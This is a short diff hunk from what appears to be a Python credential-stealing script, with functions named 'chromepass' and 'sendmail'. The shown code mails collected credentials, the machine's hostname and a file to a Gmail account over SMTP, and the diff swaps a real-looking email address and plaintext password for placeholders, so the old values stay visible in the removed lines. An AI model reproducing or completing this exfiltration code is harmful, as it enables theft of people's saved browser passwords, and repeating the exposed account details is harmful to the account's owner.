@@ -75,12 +75,12 @@ def chromepass():
 def sendmail(f1,creds):
     try:
         user = socket.gethostname()
-        from_addr = "abirzore27@gmail.com"
-        to_addr   = "abirzore27@gmail.com"
+        from_addr = "EMAIL@gmail.com"
+        to_addr   = "EMAIL@gmail.com"
 
         msg =  "---------\n" + MIMEText(creds).as_string() + "\n" + user + "\n" + f1 + "\n" 
-        username  = "abirzore27@gmail.com"
-        password  = "Goldeneyey1!"
+        username  = "EMAIL@gmail.com"
+        password  = "PASSWORD"
         server    = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
         server.login(username,password)
